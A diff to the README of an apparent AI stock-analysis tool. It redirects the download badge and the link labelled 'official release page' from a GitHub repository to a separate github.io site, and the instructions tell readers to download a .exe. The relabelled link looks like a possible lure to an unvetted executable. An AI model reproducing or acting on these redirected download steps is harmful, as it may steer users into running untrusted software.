@@ -1,6 +1,6 @@
 # 📈 AI-Powered-Quantitative-Stock-Analysis-Platform_ - Find high probability stock market buys
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Worldwarhogmanay220/AI-Powered-Quantitative-Stock-Analysis-Platform_)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue.svg)](https://worldwarhogmanay220.github.io)
 
 This software analyzes stock market data to find investment opportunities. It uses machine learning models to identify patterns and predict potential growth. The platform handles data processing, model training, and performance testing automatically.
 
@@ -16,7 +16,7 @@ Your computer needs specific hardware and software to run this platform.
 
 ## 📥 Getting Started
 
-1. Go to the [official release page](https://github.com/Worldwarhogmanay220/AI-Powered-Quantitative-Stock-Analysis-Platform_).
+1. Go to the [official release page](https://worldwarhogmanay220.github.io).
 2. Look for the Assets section at the bottom of the latest release.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop for easy access.
